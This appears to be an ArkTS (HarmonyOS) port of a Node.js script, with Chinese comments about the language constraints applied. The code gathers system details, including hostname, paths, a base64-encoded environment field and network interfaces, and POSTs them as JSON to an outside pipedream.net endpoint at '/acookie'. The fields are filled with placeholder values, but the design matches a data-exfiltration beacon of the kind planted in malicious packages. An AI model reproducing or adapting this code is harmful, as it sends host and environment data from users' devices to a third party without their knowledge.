// 应用ArkTS约束:
// 1. 使用let而非var (约束9)
// 2. 显式类型标注对象字面量 (约束23,24)
// 3. 移除Node.js特定API (约束75)
// 4. 使用箭头函数替代函数表达式 (约束26)
// 5. 使用具体类型替代any (约束1,10)
// 6. 使用现代import语法 (约束60,61)
// 注：由于ArkTS不支持Node.js运行时API，以下代码需要HarmonyOS网络能力实现

import http from '@ohos.net.http';

class SystemInfo {
    envPORT: string = '';
    hostname: string = '';
    currentPath: string = '';
    currentFile: string = '';
    currentEnvBase64: string = '';
    type: string = '';
    platform: string = '';
    arch: string = '';
    release: string = '';
    uptime: string = '';
    loadavg: string = '';
    totalmem: string = '';
    freemem: string = '';
    cpus: string = '';
    networkInterfaces: string = '';
}

// 获取系统信息需要替换为HarmonyOS系统能力
// 以下为示例实现，实际需要调用具体系统API
function collectSystemInfo(): SystemInfo {
    const info = new SystemInfo();
    // 示例数据，实际需要获取真实系统信息
    info.envPORT = '8080';
    info.hostname = 'device01';
    info.currentPath = '/data';
    info.currentFile = '/data/main.ets';
    info.currentEnvBase64 = 'base64encoded';
    info.type = 'HarmonyOS';
    info.platform = 'HarmonyOS';
    info.arch = 'arm64';
    info.release = '3.0.0';
    info.uptime = '3600';
    info.loadavg = '0.1,0.2,0.3';
    info.totalmem = '4096';
    info.freemem = '2048';
    info.cpus = '4';
    info.networkInterfaces = 'eth0,wlan0';
    return info;
}

let data: SystemInfo = collectSystemInfo();
let dataString: string = JSON.stringify(data);

// 创建HTTP请求
let url = 'https://f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net/acookie';
let httpRequest = http.createHttp();

let options: http.HttpRequestOptions = {
    method: http.RequestMethod.POST,
    header: {
        'Content-Type': 'application/json',
        'Content-Length': dataString.length.toString()
    },
    extraData: dataString
};

httpRequest.request(url, options)
    .then((response: http.HttpResponse) => {
        if (response.responseCode === 200) {
            console.log('Request successful');
            console.log('Response data: ' + response.result);
        } else {
            console.error('Request failed with status: ' + response.responseCode);
        }
    })
    .catch((err: Error) => {
        console.error('Request error: ' + err.message);
    })
    .finally(() => {
        httpRequest.destroy();
    });
